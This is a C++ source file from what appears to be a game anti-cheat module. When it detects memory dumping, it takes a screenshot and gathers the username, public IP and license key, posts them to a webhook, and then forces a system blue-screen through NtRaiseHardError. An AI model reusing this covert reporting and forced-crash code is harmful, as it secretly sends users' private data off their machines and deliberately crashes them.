#include "pch.h"
__RtlAdjustPrivilege rtl = nullptr;
__NtRaiseHardError NtRaiseHardError = nullptr;
size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
	((std::string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}
std::string GetIP() {
	CURL* curl = curl_easy_init();

	if (!curl)
		return "null";

	std::string to_return;

	curl_easy_setopt(curl, CURLOPT_URL, "http://api.ipify.org/");

	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0);

	curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0);

	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &to_return);

	auto code = curl_easy_perform(curl);

	return to_return;
}
std::string send(const char* data) {
	CURL* curl = curl_easy_init();
	curl_mime* mime;
	curl_mimepart* part;
	curl_mimepart* part1;
	if (!curl)
		return "null";

	std::string to_return;

	curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK);

	//
	mime = curl_mime_init(curl);
	//
	remove("C:\\Windows\\Temp.png");
	SaveBitmap(L"C:\\Windows\\Temp.png");
	part = curl_mime_addpart(mime);
	curl_mime_name(part, "file");
	curl_mime_filedata(part, "C:\\Windows\\Temp.png");
	//
	part = curl_mime_addpart(mime);
	curl_mime_name(part, "payload_json");
	curl_mime_data(part, data, CURL_ZERO_TERMINATED);

	curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &to_return);

	auto code = curl_easy_perform(curl);

	return to_return;
}
const char* GetName(HANDLE a) {
	char buff[MAX_PATH];
	GetModuleFileNameEx(a, 0, (LPSTR)&buff, MAX_PATH);
	return PathFindFileName(buff);
}
const char* LoadKey() {
	std::fstream input;
	static std::string key;
	input.open("C:\\vnmod.lic", std::ios::in);
	getline(input, key);
	input.close();
	return key.c_str();
}
void Terminate(const char* attackedprocess, DWORD startprocess, SIZE_T nSize) {
	char buff[900];
	sprintf_s(buff, R"({
	  "content": "[ANTICLIENT 1.1.0]\n\n[Device Information]\n+ Name: %s\n+ IP: %s\n+ Authkey: %s\n+ Cheat type: CHEAT_TYPE.DUMPING_DIFF\n[Debug info]\n+ Attacked process: %s\n+ Dump start address: 0x%X\n+ Dump size: %d",
	  "embeds": null
	})", getenv("username"), GetIP().c_str(), LoadKey(), attackedprocess, startprocess, nSize);
	send(buff);
	BSOD();
}
void BSOD() {
	rtl = (__RtlAdjustPrivilege)GetProcAddress(GetModuleHandle("ntdll"), "RtlAdjustPrivilege");
	NtRaiseHardError = (__NtRaiseHardError)GetProcAddress(GetModuleHandle("ntdll"), "NtRaiseHardError");
	BOOLEAN bl;
	ULONG Response;
	rtl(19, TRUE, FALSE, &bl);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response);
}
void Console() {
	if (!AllocConsole()) {
		// Add some error handling here.
		// You can call GetLastError() to get more info about the error.
		return;
	}

	// std::cout, std::clog, std::cerr, std::cin
	FILE* fDummy;
	freopen_s(&fDummy, "CONOUT$", "w", stdout);
	freopen_s(&fDummy, "CONOUT$", "w", stderr);
	freopen_s(&fDummy, "CONIN$", "r", stdin);
	std::cout.clear();
	std::clog.clear();
	std::cerr.clear();
	std::cin.clear();

	// std::wcout, std::wclog, std::wcerr, std::wcin
	HANDLE hConOut = CreateFile(_T("CONOUT$"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hConIn = CreateFile(_T("CONIN$"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	SetStdHandle(STD_OUTPUT_HANDLE, hConOut);
	SetStdHandle(STD_ERROR_HANDLE, hConOut);
	SetStdHandle(STD_INPUT_HANDLE, hConIn);
	std::wcout.clear();
	std::wclog.clear();
	std::wcerr.clear();
	std::wcin.clear();
}